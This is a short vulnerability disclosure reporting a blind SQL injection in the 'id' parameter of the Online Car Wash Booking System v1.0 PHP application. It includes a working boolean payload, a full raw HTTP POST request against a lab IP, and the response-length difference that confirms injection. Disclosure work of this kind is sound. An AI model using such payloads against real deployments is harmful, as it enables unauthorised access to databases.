# Online Car Wash Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15274/online-car-wash-booking-system-phpoop-free-source-code.html

Vulnerability File:  /ocwbs/classes/Master.php?f=get_vehicle_service

Vulnerability location: /ocwbs/classes/Master.php?f=get_vehicle_service, id

Current database name: ocwbs_db,length is 8

[+] Payload: id=3' and length(database()) =8--+  // Leak place ---> id

```sql
POST /ocwbs/classes/Master.php?f=get_vehicle_service HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/ocwbs/?p=booking
Content-Length: 34
Cookie: PHPSESSID=qr1o26kvu55cqqitadqht6jna5
Connection: close

id=3' and length(database()) =8--+
```

When length (database ()) = 7, Content-Length: 30

![image](https://user-images.githubusercontent.com/54017627/169306689-7bf940aa-bd23-404a-81ad-a78b2be2320b.png)

When length (database ()) = 8, Content-Length: 304

![image](https://user-images.githubusercontent.com/54017627/169306735-76297101-c26a-4692-861f-a2ad5bc0d31a.png)

